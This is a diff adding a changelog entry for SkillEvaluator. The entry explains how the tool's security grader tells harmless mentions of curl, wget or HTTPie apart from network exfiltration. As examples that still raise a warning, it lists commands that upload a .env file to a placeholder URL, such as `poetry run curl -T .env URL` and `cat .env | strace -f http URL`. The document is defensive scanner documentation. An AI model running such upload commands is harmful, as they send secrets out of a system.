@@ -310,6 +310,26 @@ All notable changes to SkillEvaluator are documented in this file.
   `quality-check` before any report was written. The schema check reports the
   malformed `metadata`, and the quality score counts `metadata.author` and
   `metadata.tags` as missing, as it already did for other non-mapping values.
+- Tier 3 security grading no longer reports a network-exfiltration warning,
+  which lowered the Security score to 0.5, when a command only names `curl`,
+  `wget`, or HTTPie as data: `apt-get install -y curl`, `which curl`,
+  `grep -rn http src/`, `env | grep -i http`, or a client mentioned in a shell
+  comment or here-document prose. Every client named after another command is
+  now checked with its own upload rules, as for a direct invocation, so
+  `find . -exec curl -d @{} URL \;`, `poetry run curl -T .env URL`, and
+  `find . -name wget -exec curl -d @.env URL \;` still warn. Any client that a
+  runner such as `ssh`, `docker`, `kubectl`, `chroot`, `systemd-nspawn`,
+  `bwrap`, or `ip netns exec` starts in another host, container, root, user, or
+  network namespace warns as before, also behind a pass-through wrapper such
+  as `strace`, `ionice`, `flock`, or `watch`. Piped or redirected input stays
+  with a text consumer such as `grep`, `awk`, `sed`, or `jq`; any other
+  command may pass it on, so `cat .env | strace -f http URL` still warns.
+  Lookups such as `$(which curl)`, `$(which curl | head -1)`,
+  `$(command -v curl 2>/dev/null)`, `$(readlink -f $(which curl))`, and
+  `$(which ssh)`, and `$CURL` after a plain, `export`, or `declare`
+  assignment, resolve to the client or runner they name. A command printed by
+  `$(echo curl -d @.env URL)` or `$(printf ...)` keeps its printed arguments.
+  Both the host checker and the bundled Harbor verifier apply these rules.
 
 ## 0.6.0 - 2026-10-20
 
